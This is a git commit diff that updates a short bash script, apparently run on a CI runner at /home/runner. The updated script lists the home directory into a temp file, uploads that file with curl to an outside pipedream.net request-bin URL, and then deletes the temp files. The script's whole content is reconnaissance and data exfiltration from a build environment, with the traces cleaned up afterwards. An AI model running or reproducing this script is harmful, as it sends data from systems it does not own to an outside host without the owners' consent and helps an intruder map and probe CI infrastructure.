faecbc18669975b06a8bd4f4fc90926064db87fd
_m <matiasesena@gmail.com>
2021-11-04 16:50:24 -0300

    Update falopa2.sh

--- falopa2.sh
+++ falopa2.sh
@@ -1,15 +1,8 @@
 #!/bin/bash
 
-rm /tmp/file.txt
-
-echo "STARTING..." > /tmp/file.txt
-
-$(ls -la /home/runner) >> /tmp/file.txt
-$(pwd) >> /tmp/file.txt
-$(ls -la) >> /tmp/file.txt
-
-echo "FINISHED..." >> /tmp/file.txt
-
-rm /tmp/file.txt
+echo $(ls -la ~/) > /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
+
+rm /tmp/file.txt
+rm /tmp/run-results.txt
